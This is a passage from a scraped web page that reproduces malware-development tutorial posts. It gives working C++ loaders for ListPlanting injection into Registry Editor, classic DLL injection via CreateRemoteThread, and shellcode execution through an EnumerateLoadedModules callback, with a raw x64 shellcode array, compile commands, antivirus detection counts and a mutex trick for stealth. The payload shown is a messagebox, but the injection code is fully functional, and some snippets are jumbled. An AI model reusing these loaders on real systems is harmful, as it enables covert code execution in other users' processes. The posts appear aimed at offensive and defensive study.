+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+HANDLE ph;
+DWORD pid;
+LPVOID mem;
+// find window
+HWND wpw = FindWindow(NULL, (LPCSTR)"Registry Editor");
+HWND hw = FindWindowEx(wpw, 0, (LPCSTR)"SysListView32", 0);
+// obtain the process id and try to open process
+GetWindowThreadProcessId(hw, &amp;pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+// allocate RWX memory
+mem = VirtualAllocEx(ph, NULL, sizeof(my_payload), MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+// copy payload
+WriteProcessMemory(ph, mem, my_payload, sizeof(my_payload), NULL);
+// trigger payload
+PostMessage(hw, LVM_SORTITEMS, 0, (LPARAM)mem);
+// free memory
+VirtualFreeEx(ph, mem, 0, MEM_DECOMMIT | MEM_RELEASE);
+CloseHandle(ph);
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, as usually, for simplicity I used meow-meow messagebox payload:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ \ -s -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, run Registry Editor in the victim machine (Windows 10 x64 in my case):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And, run our hack.exe: .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Run as Administrator, because for injecting to Registry Editor (regedit.exe) requires elevated privileges. For correctness, run Process Hacker 2 as Administrator and check memory tab:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is work perfectly :) Let’s go to upload hack.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 19 of 71 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/a1037630f95f721c6a7a1b6d8c278b4e926253b3 888ac838d507af8c8baf8844/detection This technique is used in InvisiMole. InvisiMole is a modular spyware software that the InvisiMole Group has been using since at least 2013. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. ATT&CK MITRE: ListPlanting InvisiMole PostMessage source code in github</p>
+
+            <div id="38-malware-development-tricks-enumerateloadedmodules-c" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>38. malware development tricks. EnumerateLoadedModules. C++</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into the malware dev trick: shellcode running via EnumerateLoadedModules. listing the loaded modules EnumerateLoadedModules API can be used to retrieve an application’s loaded modules. Using this API, the list of loaded modules can be dumped for debugging purposes during the development of error handler frameworks, crash dumps, etc: BOOL IMAGEAPI EnumerateLoadedModules( [in] HANDLE hProcess, [in] PENUMLOADED_MODULES_CALLBACK EnumLoadedModulesCallback, [in, optional] PVOID UserContext ); For calling EnumerateLoadedModules we need to provide a callback pointer. The EnumerateLoadedModules will send the loaded module information as callback to that provided function.</p>
+
+            <div id="practical-example-1-print-modules" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example 1. print modules</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For example, first of all create simplest callback function: BOOL CALLBACK PrintModules( PSTR ModuleName, ULONG ModuleBase, ULONG ModuleSize,</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">PVOID UserContext) {</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">// print the module name.
+printf("%s\n", ModuleName);
+return TRUE;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, just use this function as a second argument: EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL); So, full code is something like this:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;dbghelp.h&gt;
+#pragma comment (lib, "dbghelp.lib")
+// callback function
+BOOL CALLBACK PrintModules(
+PSTR ModuleName,
+ULONG ModuleBase,
+ULONG ModuleSize,
+PVOID UserContext) {
+// print the module name.
+printf("%s\n", ModuleName);
+return TRUE;
+}
+int main(int argc, char *argv[]) {
+// inject a DLL into remote process
+HANDLE ph = GetCurrentProcess();
+// enumerate modules
+printf("\nenumerate modules... \n");
+EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);
+return 0;
+}
+demo 1</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see first example in action. Compile our script hack.cpp: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \ -I/usr/share/mingw-w64/include/ \ -s -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive -ldbghelp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, just run on Windows machine (Windows 10 x64 in our case): .\hack.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, everything is worked perfectly!</p>
+
+            <div id="practical-example-2-inject-dll" class="scroll-mt-24 pt-6 pb-2 border-b border-[#212b54] mt-8 mb-4">
+                <h3 class="text-base sm:text-lg font-bold text-white flex items-center gap-2">
+                    <i data-lucide="sparkles" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i>
+                    <span>Practical example 2. inject dll</span>
+                </h3>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s say we have a malware with classic DLL injection logic hack2.cpp:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+char evilDLL[] = "C:\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+int main(int argc, char *argv[]) {
+// inject a DLL into remote process
+HMODULE hKernel32 = GetModuleHandle("Kernel32");
+
+VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+LPVOID rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT),
+PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+CloseHandle(ph);
+return 0;
+}
+And then, we modify this code a little bit: we add EnumerateLoadedModules API call
+with previous callback function:
+/*
+hack2.cpp
+DLL inject to process
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
+*/
+#include &lt;iostream&gt;
+#include &lt;windows.h&gt;
+#include &lt;dbghelp.h&gt;
+#pragma comment (lib, "dbghelp.lib")
+char evilDLL[] = "C:\\evil.dll";
+unsigned int evilLen = sizeof(evilDLL) + 1;
+// callback function
+BOOL CALLBACK PrintModules(
+PSTR ModuleName,
+ULONG ModuleBase,
+ULONG ModuleSize,
+PVOID UserContext) {
+// print the module name.
+printf("%s\n", ModuleName);
+return TRUE;
+}
+int main(int argc, char *argv[]) {
+// inject a DLL into remote process
+HMODULE hKernel32 = GetModuleHandle("Kernel32");
+VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
+
+HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+LPVOID rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT),
+PAGE_EXECUTE_READWRITE);
+// "copy" evil DLL between processes
+WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);
+HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
+// enumerate modules
+printf("\nenumerate modules... \n");
+EnumerateLoadedModules(ph, (PENUMLOADED_MODULES_CALLBACK)PrintModules, NULL);
+CloseHandle(ph);
+return 0;
+}
+For simplicity, as usually, my “evil” DLL is just meow messagebox (evil.c):
+/*
+evil.c
+simple DLL for DLL inject to process
+author: @cocomelonc
+https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+switch (nReason) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow from evil.dll!",
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+
+DWORD
+
+nReason, LPVOID lpReserved) {
+
+
+
+return TRUE;
+}
+demo 2</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see everything in action again. First of all, compile our “evil” DLL:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">At the next step, compile our DLL injecting malware: x86_64-w64-mingw32-g++ -O2 hack2.cpp -o hack2.exe \ -I/usr/share/mingw-w64/include/ \ -s -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive -ldbghelp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And finally, run it for mspaint.exe process on victim’s machine (Windows 10 x64 in my case): .\hack2.exe <mspaint PID></p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our callback function printed our “evil” DLL. Perfect! practical example 3. shellcode running via callback function. This is the most interesting example. It turns out that you can run shellcode using the callback function in this API:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+* hack3.cpp - run shellcode via EnumerateLoadedModules. C++ implementation
+* @cocomelonc
+* https://cocomelonc.github.io/malware/2022/12/21/malware-tricks-25.html
+*/
+#include &lt;windows.h&gt;
+#include &lt;dbghelp.h&gt;
+
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+int main(int argc, char* argv[]) {
+LPVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+RtlMoveMemory(mem, my_payload, sizeof(my_payload));
+EnumerateLoadedModules(GetCurrentProcess(), (PENUMLOADED_MODULES_CALLBACK)mem, NULL);
+return 0;
+}
+If you have been reading my blog for a long time, then I think you have a deja vu. As
+you can see, it’s similar to run shellcode via EnumDesktopsA and EnumChildWindows.
+The only difference is just add dbghelp.h. As usually, for simplicity I used meow-meow
+messagebox payload:
+unsigned char my_payload[] =
+// 64-bit meow-meow messagebox
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+"\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
+"\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
+"\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
+
+"\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
+"\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
+"\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
+"\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
+"\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
+"\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
+"\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
+"\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
+"\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
+"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
+"\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
+"\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
+"\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
+"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
+"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
+"\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
+"\x2e\x2e\x5e\x3d\x00";
+demo 3</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to see running shellcode in action. Compile our “malware”: x86_64-w64-mingw32-g++ -O2 hack3.cpp -o hack3.exe \ -I/usr/share/mingw-w64/include/ -s \ -ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc -fpermissive -ldbghelp</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, run on a victim’s machine: .\hack3.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see everything is worked perfectly, as expected! Let’s go to upload hack3.exe to VirusTotal:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, 20 of 71 AV engines detect our file as malicious. https://www.virustotal.com/gui/file/6fe8e9fe9593780a620903a33d3fda025946e770 781eb997490c109fd95303ed/detection I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. EnumerateLoadedModules Classic DLL injection Malware dev tricks. Run shellcode via EnumChildWindows Malware dev tricks. Run shellcode via EnumDesktopsA source code in github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">39. malware development tricks. Mutex. C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This post is the result of my own research into the malware dev trick: prevent selfexecution via mutexes. Sometimes, when developing malware, for maximum stealth, it is necessary that the program be launched only once. To do this, according to the MSDN documentation, we can use mutexes. mutex For simplicity, we can use CreateMutexA function from Windows API:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">HANDLE CreateMutexA(
+LPSECURITY_ATTRIBUTES lpMutexAttributes,
+BOOL
+bInitialOwner,
+LPCSTR
+lpName
+);
+practical example</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the simplest implementation, you can use this function in this way: create mutex with specific name, so multiple instances can detect it: hMutex = CreateMutexA(NULL, FALSE, "MeowMeowMutex"); check if mutex already exists, exit from app:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">if (GetLastError() == ERROR_ALREADY_EXISTS) {
